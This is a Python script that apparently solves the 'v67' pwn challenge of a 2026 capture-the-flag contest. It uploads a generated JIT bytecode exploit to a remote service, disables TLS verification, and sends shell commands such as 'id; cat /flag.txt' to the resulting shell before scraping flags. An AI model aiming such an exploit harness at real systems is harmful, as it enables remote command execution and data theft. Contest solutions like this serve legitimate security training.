#!/usr/bin/env python3
"""v67 -- flu.xxx CTF 2026, pwn (86 pts).  Feed a generated .v67l and drive the shell.

usage:
  python3 gen.py exp.v67l
  python3 pwn.py <host> <port> exp.v67l 'id; cat /flag.txt'
"""
import re
import socket
import ssl
import sys
import time


def main():
    if len(sys.argv) < 4:
        sys.exit(__doc__)
    host, port = sys.argv[1], int(sys.argv[2])
    blob = open(sys.argv[3], "rb").read()
    cmds = (sys.argv[4] if len(sys.argv) > 4 else "id; cat /flag.txt").encode()
    if not cmds.endswith(b"\n"):
        cmds += b"\n"

    sock = socket.create_connection((host, port), timeout=30)
    if port == 443:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    sock.settimeout(30)

    banner = b""
    while b"length" not in banner:                 # "V67L bytecode length: "
        chunk = sock.recv(4096)
        if not chunk:
            sys.exit(f"closed before the prompt: {banner!r}")
        banner += chunk
    sys.stdout.write(banner.decode("latin-1", "replace"))

    sock.sendall(str(len(blob)).encode() + b"\n")
    sock.sendall(blob)
    print(f"\n[*] sent {len(blob)} bytes of bytecode", flush=True)

    time.sleep(3)                                  # 20000 interpreted calls, then JIT
    sock.sendall(cmds)

    out = b""
    try:
        while True:
            chunk = sock.recv(0x10000)
            if not chunk:
                break
            out += chunk
            sys.stdout.write(chunk.decode("latin-1", "replace"))
            sys.stdout.flush()
    except (socket.timeout, ssl.SSLError, OSError) as exc:
        print(f"\n[*] ({type(exc).__name__})", flush=True)

    print("\n===== flags =====")
    for flag in sorted(set(re.findall(rb"flag\{[^}]*\}", out))):
        print(flag.decode())


if __name__ == "__main__":
    main()
